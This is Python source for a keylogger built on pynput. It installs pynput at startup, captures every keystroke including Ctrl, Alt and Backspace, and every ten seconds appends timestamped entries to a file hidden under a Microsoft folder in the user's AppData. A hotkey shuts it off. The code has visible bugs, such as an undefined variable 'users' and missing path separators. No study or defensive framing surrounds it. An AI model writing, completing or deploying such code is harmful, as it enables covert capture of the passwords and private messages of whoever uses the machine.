from pynput import keyboard, mouse
from datetime import datetime as dt
import time
import threading
import subprocess
from os.path import exists
import psutil


killSwitch = False
currTime = dt.now().strftime('%d/%m/%Y %H:%M:%S - ')
letter = ''
capsOn = False
phrase = ''
user = psutil.users()[0].name
checked = False

subprocess.call(['pip','install', 'pynput'])

def checkFile():
    global checked
    if(not exists(r"C:\Users\\" + users +r"AppData\Local\Microsoft\Windows\textfile.txt")):
        with open(r"C:\Users\\" + users +r"AppData\Local\Microsoft\Windows\textfile.txt", 'w+') as f:
            f.write("KEYSTROKES\n")
    checked = True


def update():
    while True:
        global phrase
        time.sleep(10)
        if(phrase == ''):
            continue
        writeToFile(phrase)
        phrase = ''
        if(killSwitch):
            return False


def writeToFile(text):
    with open(r"C:\Users\\" + users +r"AppData\Local\Microsoft\Windows\textfile.txt", 'a+') as f:
        try:
            f.write(dt.now().strftime('%d/%m/%Y %H:%M:%S - ') + str(text) + '\n')
        except:
            global killSwitch
            killSwitch = True

def kill_prog():
    global killSwitch
    killSwitch = True


threading.Thread(target=update).start()


def on_press(key):
    global capsOn
    global letter
    global phrase
    global checked
    try:
        letter = '{0}'.format(key.char)
        if(capsOn):
            letter = letter.upper()
        if(not checked):
            checkFile()
    except AttributeError:
        match key:
            case keyboard.Key.ctrl_l | keyboard.Key.ctrl_r:
                letter = '[CTRL]'
            case keyboard.Key.alt_l | keyboard.Key.alt_gr:
                letter = '[ALT]'
            case keyboard.Key.space:
                letter = ' '
            case keyboard.Key.backspace:
                letter = '[BACKSPACE]'
            case keyboard.Key.tab:
                letter = '[TAB]'
            case keyboard.Key.delete:
                letter = '[DELETE]'
            case keyboard.Key.enter:
                letter = '[ENTER]\n'
            case keyboard.Key.caps_lock:
                capsOn = not capsOn
                if(capsOn):
                    letter = '[CAPSLOCK ON]'
                else:
                    letter = '[CAPSLOCK OFF]'
            case keyboard.Key.shift | keyboard.Key.shift_r:
                letter = '[SHIFT]'
    finally:
        phrase = phrase + letter
            
        
def on_release(key):
    global killSwitch
    try:
        if(killSwitch):
            return False
    except:
        print('operation could not commence TT')
            


listener = keyboard.GlobalHotKeys({
        '<ctrl>+<alt>+f': kill_prog})
listener.start()

with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()




